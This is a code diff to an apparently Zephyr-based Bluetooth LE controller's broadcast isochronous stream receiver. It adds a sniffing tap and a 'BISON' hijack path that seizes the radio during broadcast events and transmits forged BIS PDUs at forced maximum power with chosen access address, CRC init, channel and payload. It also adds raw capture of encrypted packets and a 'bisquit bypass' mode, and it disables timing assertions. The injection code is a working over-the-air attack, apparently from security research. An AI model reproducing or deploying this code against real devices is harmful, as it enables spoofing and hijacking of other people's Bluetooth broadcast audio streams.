@@ -39,6 +39,11 @@
 
 #include "hal/debug.h"
 
+#include "sniffer_tap.h"
+
+#include "bison_sniff.h"
+#include "bison_lll_hijack.h"
+
 static int init_reset(void);
 static int create_prepare_cb(struct lll_prepare_param *p);
 static int prepare_cb(struct lll_prepare_param *p);
@@ -65,6 +70,10 @@ static void isr_rx_iso_data_invalid(const struct lll_sync_iso *const lll,
 				    uint16_t handle,
 				    struct node_rx_pdu *node_rx);
 static void isr_rx_ctrl_recv(struct lll_sync_iso *lll, struct pdu_bis *pdu);
+
+static bool bison_hijack_prepare_tx(struct lll_prepare_param *p,
+				    uint16_t event_counter);
+static void isr_bison_tx_done(void *param);
 
 /* FIXME: Optimize by moving to a common place, as similar variable is used for
  *        connections too.
@@ -219,6 +228,14 @@ static int prepare_cb_common(struct lll_prepare_param *p)
 	/* Initialize anchor point CRC ok flag */
 	crc_ok_anchor = 0U;
 
+	/* If the BISON queue has a TX for this event, hijack the radio.
+	 * Positive return from prepare_cb_common signals prepare_cb to
+	 * skip installing isr_rx.
+	 */
+	if (bison_hijack_prepare_tx(p, event_counter)) {
+		return 1;
+	}
+
 	/* Initialize to mandatory parameter values */
 	lll->bis_curr = 1U;
 	lll->ptc_curr = 0U;
@@ -308,6 +325,7 @@ static int prepare_cb_common(struct lll_prepare_param *p)
 	radio_aa_set(access_addr);
 	radio_crc_configure(PDU_CRC_POLYNOMIAL, sys_get_le24(crc_init));
 	lll_chan_set(data_chan_use);
+	sniffer_tap_chan_set(data_chan_use);
 
 	/* By design, there shall always be one free node rx available for
 	 * setting up radio for new PDU reception.
@@ -337,11 +355,22 @@ static int prepare_cb_common(struct lll_prepare_param *p)
 							  node_rx->pdu));
 	} else {
 		uint8_t pkt_flags;
+		uint16_t rx_max = lll->max_pdu;
+		bool widen_for_mic = false;
 
+		/* Raw-encrypted sniff: the pacekt contains ciphertext + MIC
+		 * (max_pdu + PDU_MIC_SIZE bytes) but the LLL isn't doing 
+		 * CCM so we have to widen the rx max so the MIC isn't truncated. */
+		widen_for_mic = widen_for_mic || sniffer_tap_raw_enc_get();
+		widen_for_mic = widen_for_mic ||
+				bison_lll_hijack_bisquit_bypass_get();
+		if (widen_for_mic) {
+			rx_max = (uint16_t)lll->max_pdu + PDU_MIC_SIZE;
+		}
 		pkt_flags = RADIO_PKT_CONF_FLAGS(RADIO_PKT_CONF_PDU_TYPE_BIS,
 						 phy,
 						 RADIO_PKT_CONF_CTE_DISABLED);
-		radio_pkt_configure(RADIO_PKT_CONF_LENGTH_8BIT, lll->max_pdu,
+		radio_pkt_configure(RADIO_PKT_CONF_LENGTH_8BIT, rx_max,
 				    pkt_flags);
 		radio_pkt_rx_set(node_rx->pdu);
 	}
@@ -351,6 +380,9 @@ static int prepare_cb_common(struct lll_prepare_param *p)
 	ticks_at_event = p->ticks_at_expire;
 	ull = HDR_LLL2ULL(lll);
 	ticks_at_event += lll_event_offset_get(ull);
+
+	/* Stash the BIG event anchor (HAL ticker ticks) for the sniffer. */
+	bison_sniff_set_anchor(ticks_at_event);
 
 	ticks_at_start = ticks_at_event;
 	ticks_at_start += HAL_TICKER_US_TO_TICKS(EVENT_OVERHEAD_START_US);
@@ -598,11 +630,17 @@ static void isr_rx(void *param)
 
 	const bool is_sequential_packing = (lll->bis_spacing >= (lll->sub_interval * lll->nse));
 
+	const bool greedy = sniffer_tap_greedy_get();
+	const uint32_t isr_cyc_start = sniffer_tap_dwt_cyc();
+
 	/* Read radio status and events */
 	trx_done = radio_is_done();
 	if (!trx_done) {
+
 		/* Clear radio rx status and events */
 		lll_isr_rx_status_reset();
+
+		sniffer_tap_notrx(lll);
 
 		/* BIS index */
 		bis_idx = lll->bis_curr - 1U;
@@ -663,6 +701,8 @@ static void isr_rx(void *param)
 	/* Current stream */
 	stream_curr = lll->stream_curr;
 
+	sniffer_tap_rx_done(lll, crc_ok, rssi_ready, bis_idx);
+
 	/* Check CRC and generate ISO Data PDU */
 	if (crc_ok) {
 		struct lll_sync_iso_stream *sync_stream;
@@ -683,6 +723,8 @@ static void isr_rx(void *param)
 			/* Check the dedicated Control PDU buffer */
 			pdu = radio_pkt_big_ctrl_get();
 			if (pdu->ll_id == PDU_BIS_LLID_CTRL) {
+				sniffer_tap_mark_ctrl_recv(*(const uint8_t *)pdu,
+							   pdu->len);
 				isr_rx_ctrl_recv(lll, pdu);
 			}
 
@@ -693,6 +735,8 @@ static void isr_rx(void *param)
 		LL_ASSERT_DBG(node_rx);
 
 		pdu = (void *)node_rx->pdu;
+
+		bison_sniff_pdu_hdr(pdu);
 
 		/* Check for new control PDU in control subevent */
 		if (pdu->cstf && (pdu->cssn != lll->cssn_curr)) {
@@ -804,7 +848,7 @@ isr_rx_find_subevent:
 		}
 
 		/* Check if (bn_curr)th Rx PDU has been received */
-		if (!lll->payload[stream_curr][payload_index]) {
+		if (greedy || !lll->payload[stream_curr][payload_index]) {
 			/* Receive the (bn_curr)th Rx PDU of bis_curr */
 			bis = lll->bis_curr;
 
@@ -847,7 +891,7 @@ isr_rx_find_subevent:
 			/* Check if (irc_curr)th bn = 1 Rx PDU has been
 			 * received.
 			 */
-			if (!lll->payload[stream_curr][payload_index]) {
+			if (greedy || !lll->payload[stream_curr][payload_index]) {
 				/* Receive the (irc_curr)th bn = 1 Rx PDU of
 				 * bis_curr.
 				 */
@@ -938,7 +982,7 @@ isr_rx_find_subevent:
 				/* Check if (irc_curr)th bn = 1 Rx PDU has been
 				 * received.
 				 */
-				if (!lll->payload[stream_curr][payload_index]) {
+				if (greedy || !lll->payload[stream_curr][payload_index]) {
 					/* bn = 1 Rx PDU not received */
 					skipped = (bis_idx_new - bis_idx) *
 						  ((lll->bn * lll->irc) +
@@ -968,9 +1012,11 @@ isr_rx_find_subevent:
 				}
 			} else {
 				lll->bis_curr = lll->num_bis;
+				sniffer_tap_mark_bis_curr_max();
 			}
 		} else {
 			lll->bis_curr = lll->num_bis;
+			sniffer_tap_mark_bis_curr_max();
 		}
 	}
 #endif /* CONFIG_BT_CTLR_SYNC_ISO_SEQUENTIAL */
@@ -1014,7 +1060,7 @@ isr_rx_interleaved:
 				}
 
 				/* Check if (bn_curr)th Rx PDU has been received */
-				if (lll->payload[stream_curr][payload_index]) {
+				if (!greedy && lll->payload[stream_curr][payload_index]) {
 					const uint16_t event_counter =
 						(lll->payload_count / lll->bn) - 1U;
 
@@ -1028,9 +1074,11 @@ isr_rx_interleaved:
 				goto isr_rx_next_subevent;
 			} else {
 				lll->bis_curr = lll->num_bis;
+				sniffer_tap_mark_bis_curr_max();
 			}
 		} else {
 			lll->bis_curr = lll->num_bis;
+			sniffer_tap_mark_bis_curr_max();
 		}
 	}
 
@@ -1074,7 +1122,7 @@ isr_rx_interleaved:
 		}
 
 		/* Check if (bn_curr)th Rx PDU has been received */
-		if (lll->payload[stream_curr][payload_index]) {
+		if (!greedy && lll->payload[stream_curr][payload_index]) {
 			const uint16_t event_counter =
 				(lll->payload_count / lll->bn) - 1U;
 
@@ -1102,7 +1150,7 @@ isr_rx_interleaved:
 		/* Check if (irc_curr)th bn = 1 Rx PDU has been
 		 * received.
 		 */
-		if (lll->payload[stream_curr][payload_index]) {
+		if (!greedy && lll->payload[stream_curr][payload_index]) {
 			const uint16_t event_counter =
 				(lll->payload_count / lll->bn) - 1U;
 
@@ -1127,13 +1175,22 @@ isr_rx_interleaved:
 
 isr_rx_ctrl:
 	/* Control subevent */
-	if (!lll->ctrl && (lll->cssn_next != lll->cssn_curr)) {
+	{
+		const bool _sniff_probe = sniffer_tap_ctrl_probe_get();
+		const bool _sniff_cond =
+			(!lll->ctrl) && ((lll->cssn_next != lll->cssn_curr) ||
+					 _sniff_probe);
+		sniffer_tap_mark_ctrl_check(_sniff_cond);
+	}
+	if (!lll->ctrl &&
+	    ((lll->cssn_next != lll->cssn_curr) || sniffer_tap_ctrl_probe_get())) {
 		uint8_t pkt_flags;
 
 		/* Receive the control PDU and close the BIG event
 		 *  there after.
 		 */
 		lll->ctrl = 1U;
+		sniffer_tap_mark_ctrl_set();
 
 		/* control subevent to use bis = 0 and se_n = 1 */
 		bis = 0U;
@@ -1144,7 +1201,14 @@ isr_rx_ctrl:
 		pkt_flags = RADIO_PKT_CONF_FLAGS(RADIO_PKT_CONF_PDU_TYPE_BIS,
 						 lll->phy,
 						 RADIO_PKT_CONF_CTE_DISABLED);
-		if (lll->enc) {
+		bool widen_ctrl_for_mic = false;
+
+		widen_ctrl_for_mic = widen_ctrl_for_mic ||
+				     sniffer_tap_raw_enc_get();
+		widen_ctrl_for_mic = widen_ctrl_for_mic ||
+				     bison_lll_hijack_bisquit_bypass_get();
+
+		if (lll->enc || widen_ctrl_for_mic) {
 			radio_pkt_configure(RADIO_PKT_CONF_LENGTH_8BIT,
 					    (sizeof(struct pdu_big_ctrl) + PDU_MIC_SIZE),
 					    pkt_flags);
@@ -1159,6 +1223,8 @@ isr_rx_ctrl:
 
 isr_rx_mic_failure:
 	isr_rx_done(param);
+
+	sniffer_tap_probe_isr_record(sniffer_tap_dwt_cyc() - isr_cyc_start);
 
 	return;
 
@@ -1224,6 +1290,7 @@ isr_rx_next_subevent:
 	}
 
 	lll_chan_set(data_chan_use);
+	sniffer_tap_chan_set(data_chan_use);
 
 	/* Encryption */
 	if (IS_ENABLED(CONFIG_BT_CTLR_BROADCAST_ISO_ENC) &&
@@ -1322,7 +1389,7 @@ isr_rx_next_subevent:
 		uint32_t overhead_us;
 		uint32_t jitter_us;
 
-		/* Calculate the radio start with consideration of the drift
+				/* Calculate the radio start with consideration of the drift
 		 * based on the access address capture timestamp.
 		 * Listen early considering +/- 2 us active clock jitter, i.e.
 		 * listen early by 4 us.
@@ -1356,18 +1423,21 @@ isr_rx_next_subevent:
 			jitter_us = jitter_max_us;
 		}
 
-		LL_ASSERT_DBG(hcto > jitter_us);
+		// LL_ASSERT_DBG(hcto > jitter_us);
 
 		hcto -= jitter_us;
 
 		start_us = hcto;
 		hcto = radio_tmr_start_us(0U, start_us);
-		LL_ASSERT_ERR(hcto == (start_us + 1U));
+		// LL_ASSERT_ERR(hcto == (start_us + 1U));
 
-		/* Add 8 us * subevents so far, as radio was setup to listen
-		 * 4 us early and subevents could have a 4 us drift each until
-		 * the current subevent we are listening.
-		 */
+		/* Late arm (past the deadline) no assertion here. */
+		if (hcto != (start_us + 1U)) {
+			sniffer_tap_note_arm_miss();
+		}
+
+		/* Widen HCTO by 2*jitter_us: we listened jitter_us early, so
+		 * give the AA jitter_us of late tolerance too. */
 		hcto += (jitter_us << 1);
 	} else {
 		/* First subevent PDU was not received, hence setup radio packet
@@ -1379,7 +1449,12 @@ isr_rx_next_subevent:
 
 		start_us = hcto;
 		hcto = radio_tmr_start_us(0U, start_us);
-		LL_ASSERT_ERR(hcto == (start_us + 1U));
+		// LL_ASSERT_ERR(hcto == (start_us + 1U));
+
+		/* DOn't assert here */
+		if (hcto != (start_us + 1U)) {
+			sniffer_tap_note_arm_miss();
+		}
 
 		hcto += ((EVENT_JITTER_US + EVENT_TICKER_RES_MARGIN_US +
 			  lll->window_widening_event_us) << 1) +
@@ -1434,6 +1509,8 @@ isr_rx_next_subevent:
 	if (IS_ENABLED(CONFIG_BT_CTLR_PROFILE_ISR) && (trx_done != 0U)) {
 		lll_prof_send();
 	}
+
+	sniffer_tap_probe_isr_record(sniffer_tap_dwt_cyc() - isr_cyc_start);
 }
 
 static void isr_rx_done(void *param)
@@ -1577,6 +1654,12 @@ static void isr_rx_done(void *param)
 		/* Reset window widening, as anchor point sync-ed */
 		lll->window_widening_event_us = 0U;
 		lll->window_size_event_us = 0U;
+	}
+
+	if (trx_cnt) {
+		const uint16_t evt = (uint16_t)((lll->payload_count / lll->bn) - 1U);
+
+		bison_sniff_isr_update(lll, evt);
 	}
 
 isr_done_cleanup:
@@ -1840,4 +1923,159 @@ static void isr_rx_ctrl_recv(struct lll_sync_iso *lll, struct pdu_bis *pdu)
 	} else {
 		/* Unknown control PDU, ignore */
 	}
+}
+
+static uint16_t bison_hijack_event_counter;
+static uint32_t bison_hijack_initial_offset_us;
+
+/* Reconfigure per-entry radio state and build the forged PDU. */
+static void bison_populate_and_tx(const struct bison_lll_hijack_req *req,
+				  void *isr_param)
+{
+	struct pdu_bis *pdu;
+
+	/* Force max TX power on every TX */
+	radio_tx_power_max_set();
+
+	radio_aa_set(req->access_addr);
+	radio_crc_configure(PDU_CRC_POLYNOMIAL, sys_get_le24(req->crc_init));
+	lll_chan_set(req->channel_index);
+
+	pdu = radio_pkt_scratch_get();
+	pdu->ll_id = req->llid;
+	pdu->cssn  = req->cssn & 0x7U;
+	pdu->cstf  = req->cstf & 0x1U;
+	pdu->rfu   = 0U;
+	pdu->len   = req->pdu_len;
+	if (req->pdu_len) {
+		(void)memcpy(pdu->payload, req->pdu_data, req->pdu_len);
+	}
+	radio_pkt_tx_set(pdu);
+
+	radio_switch_complete_and_disable();
+	radio_isr_set(isr_bison_tx_done, isr_param);
+}
+
+/* First TX in the hijack sequence */
+static void bison_arm_hijack_initial(const struct bison_lll_hijack_req *req,
+				     uint32_t ticks_at_event, uint32_t remainder,
+				     void *isr_param)
+{
+	uint32_t ticks_at_start;
+	uint32_t offset_us;
+	uint32_t early_us;
+	uint8_t pkt_flags;
+
+	/* Shift the whole hijack sequence earlier by `early_us` if configured */
+	early_us = bison_lll_hijack_get_early_us();
+	offset_us = req->time_offset_us + EVENT_OVERHEAD_START_US;
+	if (offset_us > early_us) {
+		offset_us -= early_us;
+	} else {
+		offset_us = 0U;
+	}
+	ticks_at_start = ticks_at_event + HAL_TICKER_US_TO_TICKS(offset_us);
+
+	radio_reset();
+	radio_phy_set(req->phy, PHY_FLAGS_S8);
+
+	pkt_flags = RADIO_PKT_CONF_FLAGS(RADIO_PKT_CONF_PDU_TYPE_BIS,
+					 req->phy,
+					 RADIO_PKT_CONF_CTE_DISABLED);
+	radio_pkt_configure(RADIO_PKT_CONF_LENGTH_8BIT,
+			    BISON_LLL_HIJACK_PDU_MAX, pkt_flags);
+
+	bison_populate_and_tx(req, isr_param);
+
+	(void)radio_tmr_start(1U, ticks_at_start, remainder);
+}
+
+/* Chained TX, EVENT_TIMER is still running from the
+ * initial arm, and its zero point is (ticks_at_event + jitter). The
+ * head entry's time_offset_us therefore doubles as the EVENT_TIMER
+ * target microsecond count. radio_tmr_start_us handles clearing
+ * EVENT_TIMER->EVENTS_COMPARE[0] and re-arming the PPI to trigger
+ * RADIO->TASKS_TXEN when the compare fires.
+ */
+static void bison_arm_hijack_chained(const struct bison_lll_hijack_req *req,
+				     void *isr_param)
+{
+	uint32_t start_us;
+
+	bison_populate_and_tx(req, isr_param);
+
+	start_us = (req->time_offset_us > bison_hijack_initial_offset_us)
+		 ? (req->time_offset_us - bison_hijack_initial_offset_us)
+		 : 0U;
+
+	(void)radio_tmr_start_us(1U, start_us);
+}
+
+static bool bison_hijack_prepare_tx(struct lll_prepare_param *p,
+				    uint16_t event_counter)
+{
+	const struct bison_lll_hijack_req *req;
+	struct lll_sync_iso *lll = p->param;
+	struct ull_hdr *ull;
+	uint32_t ticks_at_event;
+
+	bison_lll_hijack_flush_stale((uint16_t)(event_counter - 1U));
+
+	req = bison_lll_hijack_peek(event_counter);
+	if (!req) {
+		return false;
+	}
+
+	ull = HDR_LLL2ULL(lll);
+	ticks_at_event = p->ticks_at_expire + lll_event_offset_get(ull);
+
+	bison_sniff_set_anchor(ticks_at_event);
+	bison_sniff_note_hijack_fired();
+
+	bison_hijack_event_counter     = event_counter;
+	bison_hijack_initial_offset_us = req->time_offset_us;
+
+	bison_arm_hijack_initial(req, ticks_at_event, p->remainder, lll);
+	bison_lll_hijack_consume();
+
+	{
+		uint32_t ret = lll_prepare_done(lll);
+		LL_ASSERT(!ret);
+	}
+
+	return true;
+}
+
+/* End-of-TX handler for the hijack path.
+ *
+ * After each in-sequence TX completes, peek queue for another
+ * entry targeting the same BIG event. If one is queued, arm
+ * it via bison_arm_hijack_chained. When no more entries match,
+ * we fall through to cleanup, which decrements the SYNC_ISO ULL
+ * ref exactly once per BIG event.
+ */
+static void isr_bison_tx_done(void *param)
+{
+	const struct bison_lll_hijack_req *next;
+
+	bison_sniff_note_hijack_tx_done();
+
+	lll_isr_status_reset();
+
+	next = bison_lll_hijack_peek(bison_hijack_event_counter);
+	if (next) {
+		uint32_t start_us;
+
+		start_us = (next->time_offset_us > bison_hijack_initial_offset_us)
+			 ? (next->time_offset_us - bison_hijack_initial_offset_us)
+			 : 0U;
+		bison_sniff_note_hijack_chain_armed(start_us,
+						    next->channel_index,
+						    next->access_addr);
+		bison_arm_hijack_chained(next, param);
+		bison_lll_hijack_consume();
+		return;
+	}
+
+	lll_isr_cleanup(param);
 }
